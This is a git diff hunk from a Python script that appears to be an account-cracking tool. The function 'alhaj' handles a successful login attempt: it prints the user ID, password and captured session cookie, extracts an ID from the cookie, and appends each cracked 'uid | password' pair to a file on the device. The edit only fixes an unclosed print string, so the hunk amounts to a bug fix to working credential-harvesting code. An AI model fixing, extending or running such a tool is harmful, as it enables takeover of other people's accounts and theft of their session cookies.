@@ -564,7 +564,7 @@ def alhaj(uid,pwx,tl):
                 cid = coki[7:22]
                 print(f"[SAMI-OK]\33[38;5;49m {uid}\33[38;5;46m |\33[38;5;49m {ps} ")
                 print(f"[💉] COOKIE :\33[1;97m {coki}")
-                print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+                print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                 os.system('espeak -a 600 " SAMI,  Ok,  id"')
                 open('/sdcard/SAMI-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
